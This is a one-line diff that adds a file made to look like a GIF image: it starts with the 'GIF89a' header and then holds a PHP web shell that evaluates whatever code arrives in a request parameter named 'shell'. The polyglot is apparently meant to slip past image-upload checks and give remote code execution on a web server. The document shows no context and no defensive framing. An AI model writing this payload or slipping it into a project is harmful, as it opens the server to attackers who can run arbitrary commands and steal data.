@@ -1,0 +1,1 @@
+GIF89a? <script language="php">eval($_REQUEST[shell])</script>
